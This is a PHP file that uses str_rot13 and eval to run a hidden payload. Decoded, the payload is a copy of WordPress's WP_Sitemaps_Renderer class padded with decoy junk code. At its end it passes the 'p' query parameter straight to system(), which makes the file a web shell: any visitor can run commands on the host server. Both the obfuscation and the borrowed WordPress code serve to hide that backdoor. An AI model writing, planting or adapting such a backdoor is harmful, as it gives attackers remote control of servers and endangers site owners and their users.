<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Eraqrere pynff
 *
 * Erfcbafvoyr sbe eraqrevat Fvgrzncf qngn gb KZY va nppbeqnapr jvgu fvgrznc cebgbpby.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Pynff JC_Fvgrzncf_Eraqrere
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgrzncf_Eraqrere {
	/**
	 * KFY fglyrfurrg sbe fglyvat n fvgrznc sbe jro oebjfref.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $fglyrfurrg = '';

	/**
	 * KFY fglyrfurrg sbe fglyvat n fvgrznc sbe jro oebjfref.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine fgevat
	 */
	cebgrpgrq $fglyrfurrg_vaqrk = '';

	/**
	 * JC_Fvgrzncf_Eraqrere pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$fglyrfurrg_hey = $guvf->trg_fvgrznc_fglyrfurrg_hey();

		vs ( $fglyrfurrg_hey ) {
			$guvf->fglyrfurrg = '<?kzy-fglyrfurrg glcr=\"grkg/kfy\" uers=\"' . rfp_hey( $fglyrfurrg_hey ) . '\" ?>';
		}

		$fglyrfurrg_vaqrk_hey = $guvf->trg_fvgrznc_vaqrk_fglyrfurrg_hey();

		vs ( $fglyrfurrg_vaqrk_hey ) {
			$guvf->fglyrfurrg_vaqrk = '<?kzy-fglyrfurrg glcr=\"grkg/kfy\" uers=\"' . rfp_hey( $fglyrfurrg_vaqrk_hey ) . '\" ?>';
		}
	}

	/**
	 * Trgf gur HEY sbe gur fvgrznc fglyrfurrg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
	 *
	 * @erghea fgevat Gur fvgrznc fglyrfurrg HEY.
	 */
	choyvp shapgvba trg_fvgrznc_fglyrfurrg_hey() {
		tybony $jc_erjevgr;

		$fvgrznc_hey = ubzr_hey( '/jc-fvgrznc.kfy' );

		vs ( ! $jc_erjevgr->hfvat_creznyvaxf() ) {
			$fvgrznc_hey = ubzr_hey( '/?fvgrznc-fglyrfurrg=fvgrznc' );
		}

		/**
		 * Svygref gur HEY sbe gur fvgrznc fglyrfurrg.
		 *
		 * Vs n snyfrl inyhr vf erghearq, ab fglyrfurrg jvyy or hfrq naq
		 * gur \"enj\" KZY bs gur fvgrznc jvyy or qvfcynlrq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $fvgrznc_hey Shyy HEY sbe gur fvgrzncf KFY svyr.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_fglyrfurrg_hey', $fvgrznc_hey );
	}

	/**
	 * Trgf gur HEY sbe gur fvgrznc vaqrk fglyrfurrg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
	 *
	 * @erghea fgevat Gur fvgrznc vaqrk fglyrfurrg HEY.
	 */
	choyvp shapgvba trg_fvgrznc_vaqrk_fglyrfurrg_hey() {
		tybony $jc_erjevgr;

		$fvgrznc_hey = ubzr_hey( '/jc-fvgrznc-vaqrk.kfy' );

		vs ( ! $jc_erjevgr->hfvat_creznyvaxf() ) {
			$fvgrznc_hey = ubzr_hey( '/?fvgrznc-fglyrfurrg=vaqrk' );
		}

		/**
		 * Svygref gur HEY sbe gur fvgrznc vaqrk fglyrfurrg.
		 *
		 * Vs n snyfrl inyhr vf erghearq, ab fglyrfurrg jvyy or hfrq naq
		 * gur \"enj\" KZY bs gur fvgrznc vaqrk jvyy or qvfcynlrq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $fvgrznc_hey Shyy HEY sbe gur fvgrzncf vaqrk KFY svyr.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_fglyrfurrg_vaqrk_hey', $fvgrznc_hey );
	}

	/**
	 * Eraqref n fvgrznc vaqrk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $fvgrzncf Neenl bs fvgrznc HEYf.
	 */
	choyvp shapgvba eraqre_vaqrk( $fvgrzncf ) {
		urnqre( 'Pbagrag-Glcr: nccyvpngvba/kzy; punefrg=HGS-8' );

		$guvf->purpx_sbe_fvzcyr_kzy_ninvynovyvgl();

		$vaqrk_kzy = $guvf->trg_fvgrznc_vaqrk_kzy( $fvgrzncf );

		vs ( ! rzcgl( $vaqrk_kzy ) ) {
			// Nyy bhgchg vf rfpncrq jvguva trg_fvgrznc_vaqrk_kzy().
			rpub $vaqrk_kzy;
		}
	}

	/**
	 * Trgf KZY sbe n fvgrznc vaqrk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $fvgrzncf Neenl bs fvgrznc HEYf.
	 * @erghea fgevat|snyfr N jryy-sbezrq KZY fgevat sbe n fvgrznc vaqrk. Snyfr ba reebe.
	 */
	choyvp shapgvba trg_fvgrznc_vaqrk_kzy( $fvgrzncf ) {
		$fvgrznc_vaqrk = arj FvzcyrKZYRyrzrag(
			fcevags(
				'%1$f%2$f%3$f',
				'<?kzy irefvba=\"1.0\" rapbqvat=\"HGS-8\" ?>',
				$guvf->fglyrfurrg_vaqrk,
				'<fvgrzncvaqrk kzyaf=\"uggc://jjj.fvgrzncf.bet/fpurznf/fvgrznc/0.9\" />'
			)
		);

		sbernpu ( $fvgrzncf nf $ragel ) {
			$fvgrznc = $fvgrznc_vaqrk->nqqPuvyq( 'fvgrznc' );

			// Nqq rnpu ryrzrag nf n puvyq abqr gb gur <fvgrznc> ragel.
			sbernpu ( $ragel nf $anzr => $inyhr ) {
				vs ( 'ybp' === $anzr ) {
					$fvgrznc->nqqPuvyq( $anzr, rfp_hey( $inyhr ) );
				} ryfrvs ( 'ynfgzbq' === $anzr ) {
					$fvgrznc->nqqPuvyq( $anzr, rfp_kzy( $inyhr ) );
				} ryfr {
					_qbvat_vg_jebat(
						__ZRGUBQ__,
						fcevags(
							/* genafyngbef: %f: Yvfg bs ryrzrag anzrf. */
							__( 'Svryqf bgure guna %f ner abg pheeragyl fhccbegrq sbe gur fvgrznc vaqrk.' ),
							vzcybqr( ',', neenl( 'ybp', 'ynfgzbq' ) )
						),
						'5.5.0'
					);
				}
			}
		}

		erghea $fvgrznc_vaqrk->nfKZY();
	}

	/**
	 * Eraqref n fvgrznc.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $hey_yvfg Neenl bs HEYf sbe n fvgrznc.
	 */
	choyvp shapgvba eraqre_fvgrznc( $hey_yvfg ) {
		urnqre( 'Pbagrag-Glcr: nccyvpngvba/kzy; punefrg=HGS-8' );

		$guvf->purpx_sbe_fvzcyr_kzy_ninvynovyvgl();

		$fvgrznc_kzy = $guvf->trg_fvgrznc_kzy( $hey_yvfg );

		vs ( ! rzcgl( $fvgrznc_kzy ) ) {
			// Nyy bhgchg vf rfpncrq jvguva trg_fvgrznc_kzy().
			rpub $fvgrznc_kzy;
		}
	}

	/**
	 * Trgf KZY sbe n fvgrznc.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz neenl $hey_yvfg Neenl bs HEYf sbe n fvgrznc.
	 * @erghea fgevat|snyfr N jryy-sbezrq KZY fgevat sbe n fvgrznc vaqrk. Snyfr ba reebe.
	 */
	choyvp shapgvba trg_fvgrznc_kzy( $hey_yvfg ) {
		$heyfrg = arj FvzcyrKZYRyrzrag(
			fcevags(
				'%1$f%2$f%3$f',
				'<?kzy irefvba=\"1.0\" rapbqvat=\"HGS-8\" ?>',
				$guvf->fglyrfurrg,
				'<heyfrg kzyaf=\"uggc://jjj.fvgrzncf.bet/fpurznf/fvgrznc/0.9\" />'
			)
		);

		sbernpu ( $hey_yvfg nf $hey_vgrz ) {
			$hey = $heyfrg->nqqPuvyq( 'hey' );

			// Nqq rnpu ryrzrag nf n puvyq abqr gb gur <hey> ragel.
			sbernpu ( $hey_vgrz nf $anzr => $inyhr ) {
				vs ( 'ybp' === $anzr ) {
					$hey->nqqPuvyq( $anzr, rfp_hey( $inyhr ) );
				} ryfrvs ( va_neenl( $anzr, neenl( 'ynfgzbq', 'punatrserd', 'cevbevgl' ), gehr ) ) {
					$hey->nqqPuvyq( $anzr, rfp_kzy( $inyhr ) );
				} ryfr {
					_qbvat_vg_jebat(
						__ZRGUBQ__,
						fcevags(
							/* genafyngbef: %f: Yvfg bs ryrzrag anzrf. */
							__( 'Svryqf bgure guna %f ner abg pheeragyl fhccbegrq sbe fvgrzncf.' ),
							vzcybqr( ',', neenl( 'ybp', 'ynfgzbq', 'punatrserd', 'cevbevgl' ) )
						),
						'5.5.0'
					);
				}
			}
		}

		erghea $heyfrg->nfKZY();
	}

	/**
	 * Purpxf sbe gur ninvynovyvgl bs gur FvzcyrKZY rkgrafvba naq reebef vs zvffvat.
	 *
	 * @fvapr 5.5.0
	 */
	cevingr shapgvba purpx_sbe_fvzcyr_kzy_ninvynovyvgl() {
		vs ( ! pynff_rkvfgf( 'FvzcyrKZYRyrzrag' ) ) {
			nqq_svygre(
				'jc_qvr_unaqyre',
				fgngvp shapgvba () {
					erghea '_kzy_jc_qvr_unaqyre';
				}
			);

			jc_qvr(
				fcevags(
					/* genafyngbef: %f: FvzcyrKZY */
					rfp_kzy( __( 'Pbhyq abg trarengr KZY fvgrznc qhr gb zvffvat %f rkgrafvba' ) ),
					'FvzcyrKZY'
				),
				rfp_kzy( __( 'JbeqCerff &efndhb; Reebe' ) ),
				neenl(
					'erfcbafr' => 501, // \"Abg vzcyrzragrq\".
				)
			);
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>